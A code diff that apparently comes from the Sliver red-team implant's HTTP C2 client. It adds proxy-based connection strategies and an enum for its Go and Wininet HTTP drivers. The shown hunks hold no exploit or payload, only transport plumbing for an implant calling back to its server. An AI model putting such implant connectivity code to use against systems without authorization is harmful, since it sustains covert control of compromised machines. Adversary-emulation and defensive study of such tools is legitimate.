@@ -37,8 +37,6 @@ import (
 
 	// {{if .Config.Debug}}
 	"log"
-	"reflect"
-	"runtime"
 
 	// {{end}}
 
@@ -160,9 +158,18 @@ func newSliverHTTPClientGenerator(address string, pathPrefix string, opts *HTTPO
 	for _, driver := range getHTTPClientDriverOptions(opts) {
 		for _, secure := range getHTTPClientSecureOptions(opts) {
 			g.strategies = append(g.strategies, SliverHTTPClientGenerationStrategy{
-				Secure: secure,
-				Driver: driver,
+				Secure:   secure,
+				Driver:   driver,
+				ProxyURL: nil,
 			})
+
+			for _, proxyURL := range getHTTPClientProxyOptions(g.getOrigin(secure), driver, opts) {
+				g.strategies = append(g.strategies, SliverHTTPClientGenerationStrategy{
+					Secure:   secure,
+					Driver:   driver,
+					ProxyURL: proxyURL,
+				})
+			}
 		}
 	}
 
@@ -183,7 +190,7 @@ func (g *SliverHTTPClientGenerator) Next() bool {
 		currentStrategy, g.strategies = g.strategies[n-1], g.strategies[:n-1]
 
 		origin := g.getOrigin(currentStrategy.Secure)
-		driver, err := currentStrategy.Driver(origin, currentStrategy.Secure, g.Opts)
+		driver, err := currentStrategy.Driver.GetImpl()(origin, currentStrategy.Secure, currentStrategy.ProxyURL, g.Opts)
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("XXX [SliverHTTPClientGenerator] (Strategy: %+v) failed to initialize driver: %v", currentStrategy, err)
@@ -230,20 +237,37 @@ func (g *SliverHTTPClientGenerator) getOrigin(secure bool) string {
 }
 
 type SliverHTTPClientGenerationStrategy struct {
-	Secure bool
-	Driver func(string, bool, *HTTPOptions) (HTTPDriver, error)
+	Secure   bool
+	Driver   HTTPDriverType
+	ProxyURL *url.URL
 }
 
-// {{if .Config.Debug}}
+type HTTPDriverType int
+
+const (
+	GoHTTPDriverType HTTPDriverType = iota
+	WininetHTTPDriverType
+)
+
+func (d HTTPDriverType) String() string {
+	switch d {
+	case GoHTTPDriverType:
+		return "GoHTTPDriver"
+	case WininetHTTPDriverType:
+		return "WininetHTTPDriver"
+	default:
+		return ""
+	}
+}
+
 func (s *SliverHTTPClientGenerationStrategy) String() string {
 	return fmt.Sprintf(
-		"SliverHTTPClientGenerationStrategy[Secure=%t Driver=%s]",
+		"SliverHTTPClientGenerationStrategy[Secure=%t Driver=%s ProxyURL=%s]",
 		s.Secure,
-		runtime.FuncForPC(reflect.ValueOf(s.Driver).Pointer()).Name(),
+		s.Driver.String(),
+		s.ProxyURL,
 	)
 }
-
-// {{end}}
 
 // HTTPDriver - The interface to send/recv HTTP data
 type HTTPDriver interface {
